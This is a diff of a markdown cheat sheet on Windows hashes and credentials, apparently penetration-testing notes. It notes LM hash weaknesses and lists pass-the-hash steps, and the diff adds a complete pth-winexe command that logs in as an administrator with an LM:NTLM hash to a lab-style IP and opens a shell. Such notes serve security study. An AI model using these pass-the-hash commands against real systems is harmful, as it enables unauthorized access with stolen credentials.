@@ -1,4 +1,4 @@
-# Windows
+# Hashes and Credentials
 
 ## LM hashes
 - Password longer than 7 is split and each half hashed separately
@@ -21,6 +21,13 @@ Auth using username and NTLM hash (since NTLM and LM hashes are not salted)
 - Copy admins dumped hash (LM:NTML)
 - export SMBHASH=LM:NTML
 - pth-winexe -U administrator% //ip cmd
+
+### pth-winexe
+```
+pth-winexe
+-U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+//10.10.10.63 cmd
+```
 
 ## RDP
 ```
